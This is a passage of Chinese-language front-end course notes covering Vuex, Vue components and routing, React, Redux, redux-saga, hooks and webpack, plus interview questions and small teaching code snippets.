        ```js
            const store = new Vuex.Store()
        ```
    4. 注入跟实例
    5. 组件中使用
        > this.$store
* VueX核心配置
    * state
    * getters
    * mutations
        > 修改state的唯一方式(必须遵循的原则)，
        * 调用方式：`store.commit(mutation,arg)`
    * actions
        > 类似于 mutations，负责异步操作（actions中可以包含异步操作, mutations中绝对不允许出现异步）
        * 调用方式：`store.dispatch(action,arg) `
    * modules
    * namespaced

* 模块化store：`modules`配置参数
    > 设置模块化后，默认只影响state的获取，getters,mutations,actions的操作不受影响（他们公用命名空间）
    ```js
        // 模块化前 -> 模块化后
        $store.state.xxx -> $store.state.[module].xxx

        // 以下操作没有变化
        $store.getters.xxx
        $store.commit(mutaition)
        $store.dispatch(action)
    ```

## day4-1

### 知识点
* Vuex模块命名空间
    > 在模块中设置`namespaced:true`
    ```js
        $store.getters.xxx -> $store.getters['module/xxx']
        $store.commit(mutaition) -> $store.commit('module/mutaition')
        $store.dispatch(action) -> $store.dispatch('module/action')
    ```
    * 在具有命名空间的模块中操作全局命名空间
        ```js
            // getters
            getters:{
                myget(state,getters,rootState,rootGetters){

                }
            },
            actions:{
                myaction(ctx,payload){
                    // ctx.dispatch()
                    // ctx.commit()
                    // ctx.state
                    // ctx.getters
                    // ctx.rootState
                    // ctx.rootGetters
                }
            }
        ```

* 映射Vuex
    > 简化vuex在组件中的操作
    * mapState([namespaced],state)      映射到组件的computed
    * mapGetters([namespaced],state)    映射到组件的computed
    * mapMutations()                    映射到组件的methods
    * mapActions()                      映射到组件的methods


## day4-2

### 面试题
* 如何监听动态路由变化
    * beforeRouteUpdate
    * watch
* 验证码验证过程
    > 目的：防止程序恶意注册
    * 类型
        * 图形验证码
        * 手机验证码
    * 实现步骤
        1. 客户端请求验证码
        2. 服务器生成验证码，并返回给前端(图片)，并在服务器保存一份（文本）
            > 第一次请求，服务器需要通过`set-cookie`响应sessiongid到客户端
            * 保存数据到sesssiong: `req.session.xxx = xxx`
        3. 客户端发送验证码到服务器
        4. 服务器校验前端发送的验证码是否与服务器的一致
            > 请求参数与session数据进行对比
            * 相同：放行
            * 不同：阻止
    * 依赖模块
        * express-session   用于识别用户与保存验证码
            > 原理：利用cookie来识别用户身份
            1. 第一次请求响应`Set-Cookie`，把sessionid保存在本地
            2. 以后的每次请求自动携带sessionid
        * svg-captcha       生成验证码
    
## day4-3

### 面试题
* js中的严格模式
    > 'use strict'
    * 为什么会有严格模式
* ES6中的扩展运算符 `...`
    ```js
        arr = [10,20,30]
        obj = {a:10,b:20,c:30}

        // 用法一：扩展操作
        [...arr]
        {...obj}
        rest(...arr); // 等效于rest(10,20,30)

        // 用法二：剩余操作
        function rest(a,...b){}
        rest(10,20,30)
        rest(10,20,30,40,50)

        const {a,...b} = {a:1,b:2,c:3}; // a:1,b:{b:2,c:3}
        const [a,...b] = [10,20,30,40];// a:10,b:[20,30,40]

        var obj = {a:10,b:20,c:30,d:{d1:41,d2:{d1:1,d2:2}}}
        var obj2 = obj;
        var a = 'jingjing'
        var b = a;

        // 浅拷贝：只拷贝最外层数据
        // 深拷贝：拷贝全部数据
    ```

### 知识点
* 缓存组件 `<keep-alive/>`
    * 属性
        * include       String/RegExp
        * exclude       String/RegExp
        * max       
    * 钩子函数
        * activated     keep-alive包裹的组件激活时执行
        * deactivated   keep-alive包裹的组件失活时执行

    ```js
        <keep-alive>
            <router-view/>
            <component :is="xxx"/>
        </keep-alive>
    ```
* 动态组件
    * `<component/>`
        > 根据is属性显示不同的内容
        ```html
            <component is="Home"></component>
            <component :is="{}"></component>
        ```
    * `<router-view/>`
        > 根据url地址显示不同的内容

* 动画组件
    * transition            单个元素动画 
    * transition-group      多个元素动画
    ```js
        <transition>
            <div v-show="show"></div>
        </transition>

        <transition-group>
            <div></div>
            <span></span>
        </transition-group>

        <transition>
            <router-view/>
        </transition>

        <transition name="fade">
            <component is="xxx"/>
        </transition>
    ```
    * 类名
        * 修改类型前缀：利用属性name控制，默认：v
            * v-enter   -> fade-enter
            * v-enter-active    -> fade-enter-active
            * v-enter-to
            * v-leave
            * v-leave-active
            * v-leave-to
        * 修改整个类名: 利用以下transition属性，一般结合动画库实现过渡效果（animate.css）
            * enter-class
            * enter-active-class
            * enter-to-class
            * leave-class
            * leave-active-class
            * leave-to-class
            ```js
                <transition enter-active-class="animated fadeInUp">
                    <router-view/>
                </transition>
            ```

        ```css
            .v-enter{opacity:0}
            .v-enter-active{transition:opacity 0.5s;}
            .v-enter-to{opacity:1}


            .myenter{

            }
        ```

## 4-5

### 知识点
* props数据类型校验
    > 对传入的数据进行类型限制
    * 单个类型校验
        * Number
        * String
        * Boolean
        * Object
        * Array
    * 多个类型校验: []
    * 默认值: default
    * 必填：required
    * 自定义校验类型: validator

* 路径别名
    * `@`   在VueCLI中代表`src`目录

* nextTick()
    * 数据修改 -> 监听到修改（getter&setter）-> 
        ```js
            <div id="box" :style="mystyle">{{msg}}</div>
            vm = new Vue({
                data:{
                    msg:'hello',
                    mystyle:{
                        width:'100px',
                        height:'100px'
                    }
                }
            })

            vm.msg = 'hi1';
            vm.msg = 'hi2';
            vm.msg = 'hi3';
            vm.msg = 'hello';

            // 视图的更新是异步的
            box.innerText; // hello

            vm.mystyle.width = '200px';

            box.style.width;// 100px
        ```
* 路由模式
    * hash (默认) 
        > 路径中有一个非常丑陋的#
    * history
        > 刷新后404，所以history路由需要服务器的支持（除静态资源和接口外的任何请求都响应index.html的内容）
    * 原理
        * history: HTML5对`window.history`对象的增强（增加了state状态和对应的方法pushState,replaceState）
        * hash: 利用window下的hashchange事件监听hash值的改变

* dataset: 自定义属性集合
    > 符合W3C规范的自定义属性：`data-*`
    ```js
        <div data-id="10" data-old-price="100" idx="1"></div>

        div.dataset;// {id:'10',oldPrice:'100'}
    ```

## day5-1

### 面试题
* 对xxx的理解
    * 是什么
    * 解决了什么问题
    * 与其他的区别
* 请求实如何设置请求头
    ```js
        xhr = new XMLHttpRequest()
        xhr.open('post')
        // xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded')
        xhr.setRequestHeader('Content-Type','application/json')
        // xhr.send(`a=10&b=20`)
        xhr.send(`{"a":10,"b":20}`)
    ```

### 知识点
* B端与C端
* 模块化
    * commonJS      cjs         NodeJS
    * AMD                       require.js
    * CMD                       sea.js
    * ESModule                  ES6
    * UMD           通用模块规范
        > 支持commonJS,AMD,全局引入
* React使用
    1. 安装
        * react     核心库
        * react-dom / react-native
    2. 渲染：`ReactDOM.render(virtualDOM,target)`
        * virtualDOM: 虚拟DOM
            > 通过`React.createElement(type,props,children)`创建虚拟节点
            * type: 节点类型
            * props: 节点属性
            * children： 子节点
        * target: 渲染位置
* JSX
    * 要求： script 标签都需要加上 type="text/babel"
        > JSX代码会被babel编译成浏览器支持的js代码（React.createElement()）
    * 语法
        * JSX中不能使用js中的关键字
            * class -> className
            * for   -> htmlFor
            * ...
        * JSX属性必须使用驼峰
            * autofocus -> autoFocus
            * onkeyup   -> onKeyUp
            * ...
        * 必须结束标签
            ```html
                <img src=""> -> <img src="" />
                <input value=""> -> <input value="" />
            ```
        * style属性必须使用对象
            ```js
                <div style={{color:'#f00',fontSize:16}}></div>
            ```
        * js变量必须写在花括号{}内，但不允许出现 var,let,const 等声明关键字
            ```js
                <div>
                    {
                        <div>
                            <h1>{test}</h1>
                            {username}
                        </div>
                    }
                </div>
            ```
* 组件
    * 要求
        * 组件名必须大写开头
        * 只能包含一个顶层标签
    * 分类
        * 函数组件（无状态组件,UI组件）
            > 必须有返回值
        * 类组件（状态组件：状态改变组件会自动刷新）
            > 必须包含render函数，且render中有返回值
            * state
                > 修改state：`this.setState()`
            * this
                > 默认只在render,contrutor,生命周期函数中有this指向
            * 生命周期
    * 组件通讯
        * 父->子：props
            * 函数组件：函数的第一个参数为props
            * 类组件：
                * construtor第一个参数为props
                * this.props
    
* 数据挂载方式
    * 单向绑定：{}
    * 列表循环
        * map
    * 事件绑定
        > 驼峰

* 从0搭建基于webpack的React项目环境
    1. 创建目录
    2. 安装依赖
    3. 配置webpack参数

* webpack与gulp的区别
    * gulp基于任务的构建工具
        ```js
            gulp.task('sass',(done)=>{
                // 匹配文件
                gulp.src()
                // 处理文件
                .pipe(sass())


                // 输出文件
                .pipe(gulp.dest())
            })

            exports.sass = function(){

            }
        ```
    * webpack是基于配置的构建工具
        * 核心配置
            * entry: 入口（告诉webpack从哪开始分析项目）
            * output: 出口（告诉webpack把编译的文件输出到哪里）
            * devServer: 开发服务器
            * loader:    加载器
                > module.rules
            * plugins:  插件


## day5-2

### 面试题
* Vue中el,template,render配置参数的联系与执行过程
* 过滤器用在哪些地方
    * {{}}
    * v-bind
* 如何判断一个对象是否为空对象（没有任何属性的对象）
    ```js
        let o = {};//{a:1}
        if(Object.keys(o).length===0){

        }
    ```
* 如何设置一个对象的私有属性
    > Symbol
    ```php
        class Hello{
            public $a = 10;
            private $b = 20;
        }

        $h = new Hello();
    ```
    ```js
        class Hello{
            constructor(){
                this.a = 10;
                this._b = 20;

                // 利用Symbol定义私有属性
                const s = Symbol('c')
                this[s] = 30;

                console.log('symbol',this[s]);
            }
        }
        const h = new Hello();
        h.a;// 10;
        h._b;// 20
    ```
### 复习
* 程序架构
    * BS架构：web应用
    * CS架构：本地应用
* React
    * 核心库
        * react.js
        * react-dom.js / react-native.js
    * 渲染：ReactDOM.render(vNode,target)
    * 虚拟节点：React.createElement()
    * JSX
    * 组件
        > 创建一个自定义标签
        * 要求
            * 首字母大写
            * 自能有一个根元素
        * 分类
            * 函数组件（UI组件，无状态组件，推荐）
            * 类组件（状态组件）
                * 定义
                    * class
                    * extends React.Component
                * state
                    > this.setState()
                * this
                    > contructor,render,生命周期函数中才有this指向
                * 生命周期
            * 通讯
                * 父->子：props
    * 数据挂载方式
        * 单向绑定：{}
        * 双向绑定：单向+onChange事件
        * 事件绑定：驼峰
        * 列表循环：
            > react可以渲染数组到视图中
            * map()
            * filter()
* Webpack
    * **Webpack的工作原理**：把项目当做一个整体，通过入口文件（如：index.js）分析整个项目结构，找到所有依赖模块，并利用配置好的加载器、插件处理这些模块，最后打包为一个（或多个）浏览器可识别的文件。
    * 练习
        * 从零配置基于webpack的React项目环境
            * react + react-dom
            * webpack + webpack-cli + webpack-dev-server
            * @babel/core + @babel/preset-react + babel-loader
            * html-webpack-plugin
        * 从零配置基于webpack的Vue项目环境
    * 核心配置： `webpack.config.js`
        * entry
        * output
        * devServer
        * loader: module.rules
        * plugins

### 知识点

* 组件通讯
    * 父->子： props
        1. 父组件操作：定义props属性并传递值
        2. 子组件操作
            * 函数组件：函数的第一个参数为props
            * 类组件：
                * constructor: 第一个参数为props
                * this.props
    * 子->父：把父组件的方法传到子组件中执行，并传回参数
        1. 父组件操作：把方法通过props传入子组件
        2. 子组件操作：执行父组件方法并传递参数  
    * 兄弟->兄弟：状态提升
    * 深层级组件通讯
        * 逐层传递（不推荐）
        * Context
            1. 创建 Context: `const ctx = React.createContext(defaultValue)`
                > defaultValue: 默认共享数据，在缺少第二步时得到
            2. 父组件共享数据：`Provider`
                ```js
                    <ctx.Provider value={}></ctx.Provider>
                ```
            3. 子组件获取数据：
                * 函数组件
                    * `Consumer`
                        ```js
                            <ctx.Consumer>
                                {
                                    (value)=>{
                                        return ()
                                    }
                                }
                            </ctx.Consumer>
                        ```
                    * Hook
                * 类组件
                    * `Consumer`
                    * contextType
                        > 给子组件添加`contextType`静态属性，值为创建的context
                        * 通过`this.context`获取共享数据
* 事件处理函数
    * this指向
        > 默认this为undefined
        * 改变this指向：bind
            > 一个函数被bind改变了this指向后不能再次改变
            * constructor（推荐）
            * render
    * 传参
        > fn.bind(this,...args)
    * event
        > 事件处理函数的最后一个参数

* 受控组件与非受控组件
    * 受控组件：表单元素受到state的控制
        > 需要提供修改事件（onChange）
    * 非受控组件：不受到组件state的控制，而是采用节点操作的方式控制它

* ref
    > 用在元素上得到元素节点，用在组件上，返回的是组件实例
    * 回调：`<div ref={el=>this.ele = el}>`

* props
    * Render Props
        <div render={(value)=><button>{value}</button>}>
    * chidlren
        * String    父组件传递字符
        * Object    父组件传递一个虚拟节点
        * Array     父组件传递多个虚拟节点
        * Function  传递函数到子组件执行

* React样式
    * 内联样式
    * 样式文件
        > 需要配置相应的加载器：css-loader + style-loader
    * sass: sass-loader + sass

* React.Fragment
    > 类似于原生js中的`document.createDocumentFragment()`
    * 简写：`<></>`

## day5-3

### 面试题
* 左侧固定宽度，右侧自适应
    * flex
    * 浮动+js计算
    * 定位
* 项目成员架构与任务分配
* 如何解决vuex数据刷新后丢失的问题
    > 本地存储
* Vue中的nextTick()方法的理解
    ```js
        Vue.nextTick(function(){
            // 这里的代码在下一次DOM更新完成后执行
        })

        await Vue.nextTick();
        // 这里的代码在下一次DOM更新完成后执行
    ```

### 知识点
* babel插件：@babel/plugin-proposal-class-properties
    * 在类中使用箭头函数
    * 静态属性
    * 静态方法
* 组件生命周期
    > 只有类组件才有生命周期
    * 搞懂以下问题
        * 执行过程
            * 初始阶段
                1. constructor()
                2. componentWillMount()
                3. render()
                4. componentDidMount()
            * 更新阶段： 
                * state修改
                    1. shouldComponentUpdate()
                    2. componentWillMount()
                    3. render()
                    4. componentDidMount()
                * props修改
                    1. componentWillReceiveProps
                    2. shouldComponentUpdate(nextProps,nextState); //this.props/this.state
                    3. componentWillMount(nextProps,nextState)
                    4. render()
                    5. componentDidMount(prevProps,prevState);// this.props/this.state
        * 每个生命周期函数适合做什么操作
            * ajax/定时器/延迟器/dom操作：componentDidMount()
            * 取消：componentWillUnmount()
            * 优化：shouldComponentUpdate() / PureComponent
            * 监听数据修改：componentDidUpdate()
    * 阶段
        * Initial: 初始化阶段
            * constructor
        * Mounting：挂载阶段
            * componentWillMount（不推荐）-> UNSAFE_componentWillMount()
            * componentDidMount
        * Updating：更新阶段
            * componentWillUpdate（不推荐）-> UNSAFE_componentWillUpdate()
            * componentDidUpdate
        * Unmounting：卸载阶段
            * componentWillUnmount
    * 特殊生命周期函数
        * shouldComponentUpdate
            > 改钩子函数必须返回true才能让组件渲染，一般用户性能优化
        * componentWillReceiveProps（不推荐）

* 组件更新条件
    > 一个组件在什么场景下会刷新
    * state修改：自身数据被修改
    * props修改：父组件数据被修改
    * 父组件刷新：当前组件依赖的数据没有修改
    * 强制刷新：this.forceUpdate()
* setState(newState,callback)
    ```js
        // 假设 qyt=1
        // this.state.qty = 10;
        // this.state.qty++;
        this.setState({
            // qty:10,
            qty:this.state.qty+1
        })
        this.setState({
            // qty:10,
            qty:this.state.qty+5
        })
        console.log(this.state.qty);//1
    ```
* PureComponent
    > 一个做了shouldComponentUpdate性能优化的组件


* ReactRouter
    > 一切皆组件
    * 安装
        * react-router
        * react-router-dom
    * 引入
        > 引入各种组件实现相应的功能
    * 常用组件
        * 路由类型
            * HashRouter
            * BrowserRouter
        * 路由配置
            * Route
            * Switch
            * Redirect
        * 路由跳转
            * Link
            * NavLink
        ```js
            // Vue-router
            new VueRouter({
                mode:'hash',// hisotry
                routes:[
                    {
                        path:'/home',
                        component:Home
                    }
                ]
            });

            // react-router: 一切皆组件

        ```

## day5-4

### 面试题
* 上传图片前如何预览图片
    > 把图片转成base64
    * <input type="file" /> -> File
    * FileReader
        > 通过FileReader读取File文件，然后转成base64编码
    ```js
        const reader = new FileReader();
        reader.readAsDataURL(file)
        reader.onload = function(){
            reader.result;// 得到读取文件的信息
        }
    ```
* 模块化开发规范的区别
    * CommonJS  cjs     后端（同步），require/module.exports
    * ESModule  esm     前端（同步，静态引入），import/export
    * AMD               前端（异步），require/define
    * CMD               前端（异步），require/define
    * UMD       通用模块规范

### 知识点
* 热门ReactUI框架
    * Ant-design
    * Material-UI
    * React-Bootstrap
    * ElementUI
* 路由导航
    * 声明式导航
        * Link
        * NavLink
    * 编程式导航：利用js实现路由跳转
        > 需要获取history、location、match对象
        * 如何获取history对象
            * 通过Route.component属性渲染组件
            * withRouter高阶组件
        * 路由监听
            ```js
                history.listen((location)=>{
                    // 路由发生变化会执行这里的代码，并传递location路由信息
                })
            ```
* 高阶组件HOC（High Order Component）
    > 高阶组件并不是真正的React组件，而是一个包装函数（纯函数）
    * 纯函数
        1. 不修改传入的参数
        2. 固定的输入有固定的输出

        ```js
            function sum(a,b){
                return a+b;
            }
            sum(1,2);//3
            sum(1,2);//3

            function randomNumber(min,max){
                return (Math.random()*(max-min+1)+min)
            }
            randomNumber(10,20);//12
            randomNumber(10,20);//18
        ```
    * 需求
        * 封装一个高阶组件，用于获取本地存储中的用户信息
        * 利用高阶组件实现页面访问权限控制

    * 定义高阶组件
        * 定义方式一： 属性代理
            > 注意传递props到下一层组件
        * 定义方式二： 反向继承
            > 只适用于类组件
    * 应用场景
        * 代码复用
        * 页面访问权限控制
        * ...

* ES7 装饰器: `@`
    > 简化包装函数的写法，只适用于类组件，需要安装`@babel/plugin-proposal-decorators`

* 嵌套路由
    ```js
        // App.jsx
        <Route path="/class" component={Class} />
        <Route path="/student/:id" component={Student} />

        // Class.jsx
        <Route path={match.path + "/add}" component={AddClass} />
    ```
    * match.path 与 match.url
        ```js
            // 浏览器url地址：/stuent/10
            // match.path -> /student/:id
            // match.url -> /stuent/10
        ```
* 路由监听
    ```js
        // 一般写在跟组件中（App.jsx）
        history.listen(location=>{
            // 路由发生改变时触发这里的代码，location为当前路由信息对象
        })
    ```

## day5-5

### 面试题
* 说说你所知道的数组遍历的方式
    * for
    * for...in
    * for...of
    * forEach()
    * jQuery.each()
    * lodash.each()/lodash.forEach
    * underscore.each()/underscore.forEach
* 有没有封装过Vue的组件
    * 为什么要封装组件
        * 复用
        * 维护
        * 简化操作（二次封装）
    * 如何封装组件
        * 全局：Vue.component()
        * 局部: components
    * 组件封装要注意的问题
        * 通讯
        * props类型校验
        * mixin
        * 插槽与作用域插槽
* 页面如何渲染1000条数据
    * 同时渲染的数量
    * 页面的节点数量
    * 事件监听数量
* v-for与v-if是否可以同时使用
    ```js
        // list:[{type:'a'},{type:'student'},{type:'student'}]
        computed:{studentlist(){return this.list.filter(item=>item.type=='student')}}
        <div v-for="item in list" v-if="item.type=='student'"/>
        <div v-for="item in studentlist"/>
    ```

### 知识点
* ajax请求
    * XMLHttpRequest
    * axios
    * fetch
        > fetch二次封装
* antd的使用


## day6-1

### 面试题
* 如何实时显示用户位置
    > geolocation
* 兼容性问题
    > 每个人至少背2~3题
    * 浏览器兼容性
    * 语言版本兼容性
    * 平台兼容
    * 设备兼容性问题
* 自我介绍与项目介绍

### 知识点
* 路由传参
    * 动态路由: 通过`props.match.params`获取参数
    * url参数: 通过`props.location.search`获取参数，一般配合`querystring`模块实现格式化
        > ?后的数据
        ```js
            // vue
            this.$router.push('/class?a=10&b=20')
            this.$router.push({
                path:'/class',
                query:{
                    a:10,
                    b:20
                }
            })

            // React
            history.push('/class?a=10&b=20')
            history.push({
                pathname:'/class',
                // search:'a=10&b=10',
                search:querystring.stringify({a:10,b:20})
            })
        ```
    * state: 通过`props.location.state`
        > 刷新后数据消失

* redux
    * 搞懂以下问题
        1. redux是什么？
            > 独立的状态管理工具，可以与任意的框架结合使用
        2. redux能作什么
            * 数据共享
            * 组件刷新
        3. redux如何使用
            1. 安装
                ```bash
                    npm install redux
                    yarn add redux
                ```
            2. 引用
                ```js
                    import {createStore} from 'redux'
                ```
            3. 创建store
                ```js
                    // 需要reducer与初始state
                    const reducer = function(state,action){
                        // 定义如何修改state：
                    }

                    // initState可选
                    const store = createStore(reducer,initState)
                ```
            4. 使用
                * 获取state: `store.getState()`
                * 修改state: `store.dispatch()`
                * 监听state修改：`store.subscribe()`
    * redux核心
        * store     数据仓库（用于存放共享的数据）
            * 常用方法
                * store.dispatch()  修改
                * store.getState()  获取
        * state     状态（数据）
        * reducer   定义修改state的函数（纯函数）
            > reducer必须为**纯函数**
            * 接收state和action参数
            * 必须返回一个新的state
        * action    触发修改state的动作/命令
            > 格式：`{type}`, 通过 `store.dispatch(action)`
    * 实现组件刷新
        * 组件state修改（不推荐）
            > 把redux数据放到组件state中，并配合`store.subscribe()`事件redux数据监听
        * props数据修改（父组件数据修改，推荐）
            > 利用高阶组件往当前组件内传递redux数据


## day6-2

### 面试题
* 项目相关问题
    * 花费时间：3个月+
    * 分支：master+develope+release+hotfix
    * 技术栈： Vue+Vuerouter+Vuex+Vant/ElementUI+axios/fetch
    * 难点
    * 遇到的bug
* 事件绑定方式
    * on+事件类型
    * addEventListener()
* 自定义事件
    * jquery
        ```js
            $ele.on('hello',()=>{

            })
            // 触发
            $ele.trigger('hello')
        ```
    * Vue
        ```js
            <mycomponent v-on:hello="handle" ref="mc" />

            this.$refs.mc.$on('hello',this.handle)

            // 触发
            this.$refs.mc.$emit('hello')
        ```
    * 原生
        * 定义
            * Event
            * CumstomEvent
        * 触发
            * dispatchEvent
        ```js
            // 创建一个自定义事件
            var myEvent = new Event('hello');

            // 创建一个自定义事件并传参
            var myEvent = new CustomEvent('event_name', { 
                detail: { title: 'hello laoxie'},
            }); 
            document.body.addEventListener('hello',(e)=>{
                // e.detail
            })

            // 触发
            document.body.dispatchEvent(myEvent)
        ```

* 父组件获取子组件的数据
    * $parent
    * $chilren
    * $root
    ```js
        this.$children[0].xxx
        // ref用在普通元素上，得到这个元素对应的DOM节点
        // ref用在组件上，得到这个组件的实例
        this.$refs.child.xxxx
    ```

### 复习
* redux -> flux
    * 是什么
    * 能做什么
    * 如何使用
* redux的使用步骤
    1. 安装
    2. 引用
        ```js
            import {createStore} from 'redux'
        ```
    3. 创建store
        ```js
            const initState = {

            }
            const reducer = function(state,action){

            }
            const store = createStore(reducer,initState)
        ```
    4. 在组件中使用
        * 获取状态：store.getState()
        * 修改状态：store.dispatch(action)
        * 监听状态修改：store.subscribe(callback)

* redux核心
    * store     仓库
        * dispatch()    触发修改state命令
        * getState()    获取state
    * state     状态
        > 必须设置初始值
    * reducer   修改状态的方法
        > 是一个纯函数
        * 参数为state,action
        * 必须返回一个新的state
    * action    命令/动作
        > 格式：`{type}`
        * 使用：store.dispatch(action)

* 组件刷新场景
    * state改变
    * props改变（高阶组件）

### 知识点
* react-redux
    > 原理：Context+高阶组件
    * 组件：`<Provider/>`
        > 利用Provider组件共享redux数据
    * 高阶组件：`connect()`
        > 利用connect高阶组件定义传入组件的数据
* react-redux的使用步骤
    1. Provider共享store
    2. connect定义props
        > 把redux中的数据与方法映射到组件的props

* 实现简易版Redux
    ```js
        import {createStore} from './utils/redux';

        const initState = {}
        const reducer = function(state=initState,action){
            switch(action.type){
                case 'login':
                    return {}
                case 'logout':
                    return {}
                default:
                    return state;
            }
        }
        const store = createStore(reducer,initState)
        const state = store.getState();

    ```
* Redux设计和使用的三项基本原则
    1. 数据唯一性：store是必须是唯一的
    2. 只有store能改变自己的内容
        > 只能通过 `store.dispatch()` 修改state（不能直接修改state）
    3. Reducer必须是一个纯函数
        > 纯函数: 给固定的输入，就一定会有固定的输出，而且不会有任何副作用
        * reducer可以接受state，但是绝对不能修改state，只能返回一个新的state

* redux模块化
    > 利用combineReducers()方法把多个reducer合并成一个大的reducer
* Action Creator
    > 一个用于生成action的函数，主要用于简化操作
    * `bindActionCreators()` 简化操作

## day6-3

### 面试题
* mixin的作用
* 父子组件生命周期钩子函数执行顺序
    1. 父组件beforeCreate
    2. 父组件created
    3. 父组件beforeMount
    4. 子组件beforeCreate
    5. 子组件created
    6. 子组件beforeMount
    7. 子组件的mounted
    8. 父组件mounted
* 父子通讯中如何限定数据类型
    ```js
        // Vue 
        {
            ...
            // props:['datalist','idx'],
            props:{
                datalist:Array,
                datalist:{
                    //required:true,
                    default:[]
                },
                idx:{
                    validator(){

                    }
                }
            }
        }

        <div datalist="xxx" idx="xxx">{{datalist.map()}}</div>
        this.datalist

        // React
        import PropTypes from 'prop-types'
        class Datalist extends React.Component{
            static propTypes = {}
            static defaultProps = {}
            render(){
                return (<div></div>)
            }
        }

        

        // 添加静态属性
        // props类型校验
        Datalist.propTypes = {
            data:PropTypes.array.isRequired,
            idx:PropTypes.oneOfType([PropTypes.number,PropTypes.string])
            age:function((props, propName, comName){
                if(props[propName]<10 || props[propName]>20){
                    return new Error(propName+'只能在10-20之间')
                }
            }
        }

        // props默认值
        Datalist.defaultProps = {
            data:[],
            age:18
        }

        function MyList(){
            return (<div></div>)
        }

        MyList.propTypes = {}
        MyList.defaultProps = {}

        <Datalist data={[10,20,30]} age={28} />
    ```

### 知识点
* vuex与redux对比
                特点                    状态        修改state方式       异步操作
    veux        只能配合vue使用         state       mutataion           actions
    redux       可以与任意框架使用       state       reducer             中间件

* redux中间件
    * redux-thunk
        > 增强dispatch功能，让它支持函数作为参数（并传递dispatch）
        ```js
            // 同步操作
            dispatch({type:'login',user})
            // 异步操作
            dispatch(function(dispatch){
                // ajax请求并返回结果user
                ajax().then(()=>{
                    dispatch({
                        type:'login',
                        user
                    })
                })
            })

            // vuex
            {
                mutations:{},
                actions:{
                    login(ctx,payload){
                        ajax.then(()=>{
                            ctx.commit()
                        })
                    }
                }
            }
        ```
    * redux-saga
        * Generator 生成器函数，返回一个迭代器
            * yield     暂停并返回
            * return    结束并返回
        * Iterator  迭代器
            * next()    返回格式为{value,done}的对象
            * for..of
        * 使用步骤
            1. 安装并引入
                ```js
                    import createSagaMiddleware from 'redux-saga';
                ```
            2. 创建中间件
                ```js
                    const sagaMiddleware = createSagaMiddleware();
                ```
            3. 将 sagaMiddleware 连接至 Store
                ```js
                    let enhancer = applyMiddleware(sagaMiddleware);
                    // 与其他中间件一起使用
                    // enhancer = compose(enhancer,elseMiddleware)
                    const store = createStore(reducer,enhancer)
                ```
            4. 引入并运行自定义Saga配置
                ```js
                    // saga配置文件：mysaga.js
                    import mysaga from './store/saga/mysaga';
                    sagaMiddleware.run(mysaga);
                ```

## day6-4

### 面试题
* 移动端点击事件穿透的bug
    * click事件在移动端会延迟300ms左右执行
        > 为什么要延迟300ms：因为移动端双击为放大
    * touch
        * touchstart
        * touchmove
        * touchend
    * 手势
        * 左滑动，右滑动
        * 上滑动，下滑动
        * ...
    ```js
        <button onclick="handle()">ddd</button>
        <div class="popover">
            遮罩层，点击遮罩层关闭弹窗与遮罩层
        </div>
    ```
* 事件触发的过程
    * 阶段
        * 捕获阶段
        * 触发阶段
        * 冒泡阶段
    * target
    * currentTarget
* js如何获取一个元素下的第一个和最后一个子元素
    * firstElementChild/children[0]
    * lastElementChild/children[children.length-1]
* css与sass的区别，如何编译
    * sass/node-sass
    * gulp: gulp-sass
    * webpack: sass-loader
* vue中局部样式的原理
    > 属性选择器
    ```js
        <style scoped></style>
    ```
* hash路由的原理
    > hashchange事件
* 如何根据不同的环境切换不同的路由模式
    > process.env.NODE_ENV
    * cross-env用于设置环境表示
        ```js
            "scripts":{
                "dev":"webpack-dev-server",
                "build":"webpack",
                "test":"cross-env NODE_ENV=test webpack",
                "test:uat":"cross-env NODE_ENV=uat webpack",
            }
        ```
* UAT: 用户验收测试

### 知识点
* Hook
    * 注意事项
        * 只能在函数组件或其他hook中使用
        * 不要在循环，条件或嵌套函数中调用 Hook， 确保总是在你的函数组件的最外层调用他们
        * 函数组件每次刷新都会从上往下执行完内部所有的代码
    * 分类
        * 内置Hook
        * 自定义Hook
        * 第三方Hook
    * useState: 实现类组件状态的功能
        > 使用格式：`const [qty,changeQty] = useState(initValue)`
    * useEffect: 实现类组件生命周期函数的功能
        > useEffect在渲染结束后执行
        * 用法一：默认用法（等效于componentDidMount + componentDidUpdate的效果）
            ```js
                useEffect(function(){
                    // 这里的代码在初始化与state更新都会执行
                })
            ```
        * 用法二：空依赖（等效于componentDidMount）
            ```js
                useEffect(function(){
                    // 这里的代码只有初始化时执行
                },[])
            ```
        * 用法三：指定依赖（等效于comonentDidMount+shouldComponentUpdate的效果）
            ```js
                useEffect(function(){
                    // 这里的代码在初始化和count修改时执行
                },[count]);
            ```
    * useMemo：可以缓存之前的运算结果，一般用于性能优化（实现类似于vue中computed的效果）
        > 格式：`const result = useMemo(fn)`，result得到fn的返回结果
        * 用法一：默认用法（等效于传统用法，不推荐使用）
            ```js
                const result = useMemo(function(){
                    // 这里的代码在初始化与组件刷新时都会执行，每次刷新都会重新计算
                    return xxx
                })
            ```
        * 用法二：空依赖
            ```js
                const result = useMemo(function(){
                    // 这里的代码只有初始化时执行，之后每次刷新组件都得到缓存值
                    return xxx
                },[])
            ```
        * 用法三：指定依赖
            ```js
                const result = useMemo(function(){
                    // 这里的代码在初始化和count修改时执行，否则得到缓存值
                    return xxx
                },[count]);
            ```
    * useCallback
        * 用法一：不指定依赖（不推荐）
            ```js
                const handle = useCallback(function(){
                    // 初始化和组件刷新handle都会得到一个新的函数
                })
            ```
        * 用法二：空依赖
            ```js
                const handle = useCallback(function(){
                    // 初始化时创建函数并缓存，组件刷新时得到缓存的函数（不创建）
                },[])
            ```

        * 用法三：指定依赖（当依赖发生改变时会重新创建一个函数，否则获取之前缓存的函数）
            ```js
                const handle = useCallback(function(){
                    // 初始化时和依赖更新时创建函数并缓存，否则handle得到缓存函数
                },[qty])
            ```
    * useContext

    * useReducer
        > useState的增强版，实现复杂数据的操作

## day6-5

### 面试题
* jQuery版本
    > 工具库，擅长节点操作
    * 1x        兼容低版本浏览器
    * 2x        不兼容IE8-
    * 3x        2版本的优化版本
    * jQuery.mobile 移动端版本
    * zepto.js
* jQuery中链式调用的原理
    > 在每个方法最后返回实例(this)
    ```js
        jQuery('button')
        .addClass('btn')    -> addClass中返回jquery实例对象(this)
        .on('click',function(){})   -> return this
        .text('提交')        -> return this

        jQuery('button').attr('type') -> 得到type属性值
        .addClass() -> 报错
        jQuery('button').attr('type','submit')  -> 设置type属性为submit，返回实例
        .addClass()
    ```
* 如何编写jQuery插件
    * 原型方法: jQuery.prototype
        * addClass()
